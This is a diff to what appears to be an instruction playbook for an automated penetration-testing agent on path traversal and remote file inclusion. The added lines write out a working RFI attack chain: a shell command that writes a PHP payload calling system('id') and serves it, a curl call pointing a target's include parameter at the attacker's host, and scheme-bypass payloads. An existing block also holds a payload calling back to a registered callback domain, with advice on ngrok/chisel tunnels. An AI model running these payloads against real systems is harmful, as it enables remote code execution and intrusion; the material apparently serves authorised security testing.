@@ -88,9 +88,12 @@ OOB provider:                                {path_traversal_oob_provider}
   endpoint.
 - If `Archive-extraction (Zip Slip) write tests: False`, do NOT upload archives
   with `../` entries. Stop at archive read-only inspection.
-- If `OOB callback: False`, do NOT register an interactsh domain or attempt
-  RFI / blind-LFI exfiltration through external infrastructure. Limit testing
-  to in-band reads and timing oracles.
+- If `OOB callback: False`, do NOT register an interactsh domain or route RFI /
+  blind-LFI exfiltration through EXTERNAL infrastructure (public callback
+  servers, oast providers, NAT-exposed tunnels). This does NOT forbid
+  self-hosted RFI on a box YOU control that the target reaches over a network
+  they share (Step 4C, Mode 1) -- that is in-band, in-scope lab infra and is
+  always available. Beyond that, limit testing to in-band reads and timing oracles.
 - If `PHP wrapper / log poisoning sub-section: False`, do NOT attempt
   `php://filter`, `data://`, `expect://`, `zip://`, or log-poisoning chains.
   Stick to plain-path traversal payloads.
@@ -253,10 +256,60 @@ When the target is PHP-based and the basic traversal is filtered, escalate to
 wrapper-driven LFI. See the **PHP Wrappers + Log Poisoning Workflow** section
 below for the full payload list and chain logic.
 
-#### 4C. Remote File Inclusion (CONDITIONAL on `OOB callback`=True)
+#### 4C. Remote File Inclusion -- LFI's sibling; test it on ANY `include`/`require` sink
 
-RFI requires both a vulnerable inclusion sink AND outbound HTTP / FTP egress.
-See the **OOB / RFI Workflow** section below for the interactsh-driven probe.
+A parameter that feeds a language `include()` / `require()` (PHP), a template
+loader, or any "load this path and interpret it" primitive is an RFI candidate,
+NOT just an LFI one. Whenever plain local traversal on such a parameter is
+filtered, normalised, or returns nothing, PIVOT to remote inclusion BEFORE
+abandoning the sink -- a failed LOCAL read never proves an inclusion sink dead.
+RFI needs (a) a sink that fetches+interprets a URL and (b) a server the TARGET
+can reach. Two delivery modes; ALWAYS try Mode 1 first:
+
+**Mode 1 -- self-hosted on your own box (NO external OOB; always available).**
+In an isolated lab / internal engagement the target usually has NO internet
+egress but CAN reach an attacker host on a network it shares. Host the payload
+yourself and point the sink at your own IP -- this is in-band, in-scope infra
+you control, so it does NOT depend on the external-OOB toggle:
+
+1. Find an address the target can reach you on: enumerate every network your
+   box shares with the target plus the target's default gateway
+   (`kali_shell` -> `ip -o addr`, `ip route`). On container/bridged labs the
+   shared-subnet IP or the `.1` gateway is almost always routable back to you.
+2. Stand up a plain HTTP server serving your payload file:
+   ```
+   kali_shell({{"command": "mkdir -p /tmp/rfi && printf '%s' '<?php system(\\"id\\"); ?>' > /tmp/rfi/p.php && cd /tmp/rfi && (python3 -m http.server 8000 >/tmp/rfi.log 2>&1 &) && echo up"}})
+   ```
+3. **Match the sink's exact path construction.** Inclusion sinks frequently
+   CONCATENATE a fixed suffix onto your input -- the code may be
+   `include($param . '/loader.php')`. Then your input is never the whole path
+   (which is exactly why a bare local file read fails), and your REMOTE payload
+   must live at that appended suffix under your server root. Recover the suffix
+   from an error/warning, a redirect, or by diffing which path the sink reports
+   missing; then create it. Example: if the appended suffix were `/loader.php`,
+   serve `/tmp/rfi/loader.php` and pass `param=http://<your-ip>:8000` so the sink
+   builds `http://<your-ip>:8000/loader.php`. If nothing is appended, host any
+   name and pass the full URL to it.
+4. Fire the include and read command output INLINE:
+   ```
+   execute_curl({{"args": "-s 'http://TARGET/vuln.ext?param=http://YOUR_IP:8000'"}})
+   ```
+   A remote include that executes returns your payload's OUTPUT in the response
+   body (Level-4 RCE), not merely a network ping. Prove execution with a
+   harmless `id`/`uname -a` first, then read the objective.
+
+Scheme/round-trip variants when the plain `http://` form is rejected:
+```
+param=http://YOUR_IP:PORT/                  # plain
+param=//YOUR_IP:PORT/                        # protocol-relative (bypasses some scheme allowlists)
+param=ftp://YOUR_IP:PORT/                    # alternate protocol
+param=http://YOUR_IP:PORT/x%00              # legacy null-suffix strip (old runtimes)
+```
+
+**Mode 2 -- external OOB oracle (CONDITIONAL on `OOB callback`=True).** Only when
+you genuinely cannot self-host reachably (true egress-only blind sink): use the
+interactsh oracle in the **OOB / RFI Workflow** section below to prove the sink
+fetches remote URLs.
 
 #### 4D. Archive extraction / Zip Slip (CONDITIONAL on `Archive-extraction`=True)
 
@@ -448,6 +501,12 @@ the following must be on record for each confirmed sink:
       each alternate handler that reaches the same storage (Step 4E).
 - [ ] Sensitive in-base names enumerated through the unrestricted handler,
       bare-name-first, with and without extensions.
+- [ ] If the parameter feeds an `include`/`require`/template-load sink (it
+      INTERPRETS the path rather than merely streaming bytes), REMOTE inclusion
+      tested: self-hosted RFI (Step 4C, Mode 1) attempted from an address the
+      target can reach, with the sink's appended suffix (if any) matched. Failed
+      LOCAL reads NEVER close an inclusion sink until remote inclusion has also
+      failed.
 Only once this checklist is complete may you `switch_skill` or report the class
 as not present. A 403 you never re-routed through a second handler is an open
 lead, not a closed door.
@@ -650,7 +709,10 @@ payload and observe a second-stage callback from the executed code:
 ```
 kali_shell({"command": "echo '<?php file_get_contents(\\"http://REGISTERED_DOMAIN/exec.txt\\"); ?>' > /tmp/payload.php"})
 kali_shell({"command": "python3 -m http.server 8000 --directory /tmp & echo $!"})
-# expose the server via chisel/ngrok if behind NAT, then point the RFI at it
+# expose the server via chisel/ngrok if behind NAT, then point the RFI at it.
+# If the target shares a network with you (isolated lab / internal engagement),
+# skip the tunnel entirely: serve on your shared-network IP and point the RFI
+# straight at http://<your-shared-ip>:8000/ -- see Step 4C Mode 1 (no OOB needed).
 ```
 
 A `/exec.txt` HTTP callback in the interactsh log = remote code executed
